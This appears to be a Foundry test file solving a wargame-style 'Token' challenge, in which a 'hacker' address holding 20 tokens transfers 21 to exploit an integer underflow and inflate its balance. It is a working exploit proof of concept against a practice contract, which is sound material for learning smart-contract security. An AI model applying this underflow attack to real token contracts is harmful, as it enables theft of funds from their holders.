pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IToken {
    function balanceOf(address _owner) external view returns (uint256 balance);
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract TokenTest is Test {
    IToken token;
    address public hacker = address(0x1337);
    address public dummy = address(0x9999);

    function setUp() public {
        address deployedAddress = deployCode("05_Token.sol:Token",abi.encode(21000000));
        token = IToken(deployedAddress);
        token.transfer(hacker, 20);
    }

    function testHack() public {
        vm.startPrank(hacker);
        console.log(token.balanceOf(hacker));
        token.transfer(dummy, 21);
        console.log(token.balanceOf(hacker));
        assertGt(token.balanceOf(hacker), 20);
        vm.stopPrank();
    }
}